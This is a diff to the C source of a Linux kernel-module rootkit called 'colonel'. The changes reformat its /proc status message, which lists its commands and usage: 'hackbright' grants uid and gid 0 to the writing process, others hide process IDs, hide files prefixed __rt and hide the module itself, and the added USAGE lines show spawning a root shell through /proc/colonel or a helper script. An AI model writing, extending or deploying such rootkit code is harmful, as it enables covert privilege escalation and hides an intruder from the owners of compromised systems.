@@ -10,7 +10,7 @@
       typeof (b) _b = (b); \
      _a < _b ? _a : _b; })		/* typesafe macro for retrieving the min value */
 #define MAX_PIDS 50				/* the maximum number of hidden PIDs */
-      
+
 MODULE_LICENSE("GPL");
 
 /* Declaring everything static confines all variables and functions to the module (rootkit) --
@@ -134,20 +134,30 @@ static int read_colonel(char *buffer, char **buffer_location, off_t off,
 	int size;
 
 	sprintf(module_status, 
-"colonel\n\
+"COLONEL-----------------------------------------\n\n\
 DESCRIPTION:\n\
   hides files prefixed with __rt or 10-__rt and gives root access\n\n\
+USAGE:\n\
+  From command line -- 
+  $ echo -n <command> >> /proc/colonel\n 
+  From rtcmd -- 
+  $ ./rtcmd.py hp1337\n\
+  To get root access, give the \"hackbright\" command and 
+  then fork some shell from writing process.\n
+  rtcmd.py does this if the second parameter is specified. --\n\
+  $ tools/rtcmd.py hackbright /bin/bash\n\n\
 COMMANDS:\n\
-  hackbright  - uid and gid 0 for writing process\n\
-  hpXXXX 	  - hides process id XXXX\n\
-  sp 		  - shows last hidden process\n\
-  thf		  - toggles hidden files\n\
-  mh 		  - hide module\n\
-  ms 		  - show module\n\n\
+  hackbright	- uid and gid 0 for writing process\n\
+  hpXXXX		- hides process id XXXX\n\
+  sp 			- shows last hidden process\n\
+  thf			- toggles hidden files\n\
+  mh 			- hide module\n\
+  ms 			- show module\n\n\
 STATUS-------------------------------------------\n\
   hidden files: %d\n\
   hidden PIDs: %d\n\
-  hidden module: %d\n", hidden_files, current_pid, hidden_module);
+  hidden module: %d\n
+  -----------------------------------------------\n", hidden_files, current_pid, hidden_module);
 
 	size = strlen(module_status);
 /* WTF */
